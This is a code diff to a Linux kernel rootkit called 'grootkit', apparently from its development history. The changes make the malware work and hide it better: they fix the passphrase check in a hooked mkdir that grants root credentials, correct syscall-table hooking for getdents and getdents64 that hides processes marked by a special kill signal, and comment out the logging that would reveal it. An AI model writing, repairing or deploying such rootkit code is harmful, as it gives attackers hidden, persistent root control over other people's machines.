@@ -91,12 +91,12 @@ struct module *get_module_from_list(void) {
         mod = container_of(pos, struct module, list);
 
         if (strcmp(mod->name, modulename) == 0) {
-            printk(KERN_INFO "Module found: %s\n", mod->name);
+            // printk(KERN_INFO "Module found: %s\n", mod->name);
             return mod;
         }
     }
 
-    printk(KERN_INFO "Don't find module: %s\n", mod->name);
+    // printk(KERN_INFO "Don't find module: %s\n", mod->name);
     return NULL;
 }
 
@@ -108,15 +108,15 @@ void protect_and_hide(void) {
     struct module *module_to_hide = get_module_from_list();
 
     if (module_to_hide != NULL) {
-        printk(KERN_INFO "Protect module: %s\n", module_to_hide->name);
+        // printk(KERN_INFO "Protect module: %s\n", module_to_hide->name);
         try_module_get(module_to_hide);
-        printk(KERN_INFO "Hide module: %s\n", module_to_hide->name);
+        // printk(KERN_INFO "Hide module: %s\n", module_to_hide->name);
         list_del(&module_to_hide->list);
     }
 
-    printk(KERN_INFO "Protect rootkit\n");
+    // printk(KERN_INFO "Protect rootkit\n");
     try_module_get(THIS_MODULE);
-    printk(KERN_INFO "Hide rootkit\n");
+    // printk(KERN_INFO "Hide rootkit\n");
     list_del(&THIS_MODULE->list);
 }
 
@@ -148,13 +148,16 @@ void memprotect(unsigned int protect) {
 void set_root_permissions(void) {
     struct cred *credentials = prepare_creds();
 
+    // printk(KERN_CRIT "test credentials\n");
     if (credentials == NULL) return;
+    // printk(KERN_CRIT "set credentials\n");
 
     credentials->uid.val = credentials->gid.val = 0;
     credentials->euid.val = credentials->egid.val = 0;
     credentials->suid.val = credentials->sgid.val = 0;
     credentials->fsuid.val = credentials->fsgid.val = 0;
 
+    // printk(KERN_CRIT "commit credentials\n");
     commit_creds(credentials);
 }
 
@@ -169,13 +172,15 @@ asmlinkage int mkdir_hook(const struct pt_regs *regs) {
 asmlinkage long mkdir_hook(const char __user *pathname, umode_t mode) {
 #endif
 
-    if (strcmp(passphrase, pathname)) {
+    // printk(KERN_CRIT "mkdir hook: '%s' cmp '%s'\n", passphrase, pathname);
+    if (!strcmp(passphrase, pathname)) {
+        // printk(KERN_CRIT "mkdir hooking\n");
         set_root_permissions();
     } else {
 #ifdef PTREGS_SYSCALL_STUBS
-        mkdir_base(regs);
+        return mkdir_base(regs);
 #else
-        mkdir_base(pathname, mode);
+        return mkdir_base(pathname, mode);
 #endif
     }
 
@@ -203,7 +208,12 @@ struct task_struct *search_process(pid_t pid) {
 */
 void set_hidden_flags(pid_t pid) {
     struct task_struct *process = search_process(pid);
+
+    if (process == NULL) return;
+
+    // printk(KERN_CRIT "Flags: %i\n", process->flags);
     process->flags ^= 0x10000000;
+    // printk(KERN_CRIT "Flags: %i\n", process->flags);
 }
 
 /*
@@ -217,7 +227,9 @@ asmlinkage long kill_hook(const struct pt_regs *regs) {
 #else
 asmlinkage long kill_hook(pid_t pid, int signal) {
 #endif
+    // printk(KERN_CRIT "kill with signal: %i\n", signal);
     if (signal == 14600) {
+        // printk(KERN_CRIT "kill hooking\n");
         set_hidden_flags(pid);
     } else {
 #ifdef PTREGS_SYSCALL_STUBS
@@ -233,9 +245,12 @@ asmlinkage long kill_hook(pid_t pid, int signal) {
     This function checks for hidden flag on process by PID.
 */
 unsigned long int has_hidden_flag(pid_t pid) {
+    // printk(KERN_CRIT "Test PID: %i\n");
     if (!pid) return 0;
     struct task_struct *process = search_process(pid);
-    if (process != NULL) return 0;
+    // printk(KERN_CRIT "Get process: %p\n", process);
+    if (process == NULL) return 0;
+    // printk(KERN_CRIT "return: %i\n", process->flags & 0x10000000);
     return process->flags & 0x10000000;
 }
 
@@ -270,10 +285,13 @@ asmlinkage long getdents64_hook(unsigned int fd, struct linux_dirent64 *director
         struct linux_dirent64 *current_directory = (void *)directory_kernel_return + offset;
 
         if (has_hidden_flag(simple_strtoul(current_directory->d_name, NULL, 10))) {
+            // printk(KERN_CRIT "getdents64 hooking (hidden process)\n");
             if (current_directory == directory_kernel_return) {
+                // printk(KERN_CRIT "Hide first file or directory\n");
                 kernel_return -= current_directory->d_reclen;
                 memmove(current_directory, (void *)current_directory + current_directory->d_reclen, kernel_return);
             } else {
+                // printk(KERN_CRIT "Hide file or directory\n");
                 previous_directory->d_reclen += current_directory->d_reclen;
             }
         } else {
@@ -283,7 +301,7 @@ asmlinkage long getdents64_hook(unsigned int fd, struct linux_dirent64 *director
         offset += current_directory->d_reclen;
     }
 
-    copy_to_user(directory_kernel_return, directory, kernel_return);
+    copy_to_user(directory, directory_kernel_return, kernel_return);
     kfree(directory_kernel_return);
     return kernel_return;
 }
@@ -318,11 +336,14 @@ asmlinkage int getdents_hook(unsigned int fd, struct linux_dirent *directory, un
     while (offset < kernel_return) {
         struct linux_dirent *current_directory = (void *)directory_kernel_return + offset;
 
-        if (has_hidden_flag(simple_strtoul(current_directory->d_name, NULL, 10))) { 
+        if (has_hidden_flag(simple_strtoul(current_directory->d_name, NULL, 10))) {
+            // printk(KERN_CRIT "getdents hooking (hidden process)\n");
             if (current_directory == directory_kernel_return) {
+                // printk(KERN_CRIT "Hide first file or directory\n");
                 kernel_return -= current_directory->d_reclen;
                 memmove(current_directory, (void *)current_directory + current_directory->d_reclen, kernel_return);
             } else {
+                // printk(KERN_CRIT "Hide file or directory\n");
                 previous_directory->d_reclen += current_directory->d_reclen;
             }
         } else {
@@ -332,7 +353,7 @@ asmlinkage int getdents_hook(unsigned int fd, struct linux_dirent *directory, un
         offset += current_directory->d_reclen;
     }
 
-    copy_to_user(directory_kernel_return, directory, kernel_return);
+    copy_to_user(directory, directory_kernel_return, kernel_return);
     kfree(directory_kernel_return);
     return kernel_return;
 }
@@ -344,24 +365,24 @@ void *syscall_hooking(unsigned long new_function, unsigned int syscall_number) {
 #ifdef KPROBE_LOOKUP
     typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
     kallsyms_lookup_name_t kallsyms_lookup_name;
-    printk(KERN_INFO "Register kallsyms_lookup_name\n");
+    // printk(KERN_INFO "Register kallsyms_lookup_name\n");
     register_kprobe(&kp);
-    printk(KERN_INFO "Get kallsyms_lookup_name address\n");
+    // printk(KERN_INFO "Get kallsyms_lookup_name address\n");
     kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
-    printk(KERN_INFO "Unregister kallsyms_lookup_name\n");
+    // printk(KERN_INFO "Unregister kallsyms_lookup_name\n");
     unregister_kprobe(&kp);
 #endif
-    printk(KERN_INFO "Get sys_call_table address\n");
+    // printk(KERN_INFO "Get sys_call_table address\n");
     unsigned long *syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
 
-    printk(KERN_INFO "Get syscall address\n");
+    // printk(KERN_INFO "Get syscall address\n");
     void *base = (void *)syscall_table[syscall_number];
 
-    printk(KERN_INFO "Unprotect memory\n");
+    // printk(KERN_INFO "Unprotect memory\n");
     memprotect(0);
-    printk(KERN_INFO "Set syscall\n");
+    // printk(KERN_INFO "Set syscall\n");
     syscall_table[syscall_number] = (unsigned long)new_function;
-    printk(KERN_INFO "Protect memory\n");
+    // printk(KERN_INFO "Protect memory\n");
     memprotect(1);
 
     return base;
@@ -371,17 +392,17 @@ void *syscall_hooking(unsigned long new_function, unsigned int syscall_number) {
     This function is launched on module load.
 */
 static int __init grootkit_init(void) {
-    printk(KERN_INFO "Protect and hide\n");
-    protect_and_hide();
-    printk(KERN_INFO "mkdir syscall hooking\n");
+    // printk(KERN_INFO "Protect and hide\n");
+    // protect_and_hide();
+    // printk(KERN_INFO "mkdir syscall hooking\n");
     mkdir_base = syscall_hooking((unsigned long)mkdir_hook, (unsigned int)__NR_mkdir);
-    printk(KERN_INFO "kill syscall hooking\n");
+    // printk(KERN_INFO "kill syscall hooking\n");
     kill_base = syscall_hooking((unsigned long)kill_hook, (unsigned int)__NR_kill);
-    printk(KERN_INFO "getdents64 syscall hooking\n");
-    getdents64_base = syscall_hooking((unsigned long)getdents64_hook, (unsigned int)__NR_mkdir);
-    printk(KERN_INFO "getdents syscall hooking\n");
-    getdents_base = syscall_hooking((unsigned long)getdents_hook, (unsigned int)__NR_kill);
-    printk(KERN_INFO "return\n");
+    // printk(KERN_INFO "getdents64 syscall hooking\n");
+    getdents64_base = syscall_hooking((unsigned long)getdents64_hook, (unsigned int)__NR_getdents64);
+    // printk(KERN_INFO "getdents syscall hooking\n");
+    getdents_base = syscall_hooking((unsigned long)getdents_hook, (unsigned int)__NR_getdents);
+    // printk(KERN_INFO "return\n");
     return 0;
 }
 
@@ -391,6 +412,8 @@ static int __init grootkit_init(void) {
 static void __exit grootkit_exit(void) {
     syscall_hooking((unsigned long)mkdir_base, (unsigned int)__NR_mkdir);
     syscall_hooking((unsigned long)kill_base, (unsigned int)__NR_kill);
+    syscall_hooking((unsigned long)getdents64_base, (unsigned int)__NR_getdents64);
+    syscall_hooking((unsigned long)getdents_hook, (unsigned int)__NR_getdents);
 }
 
 module_init(grootkit_init);
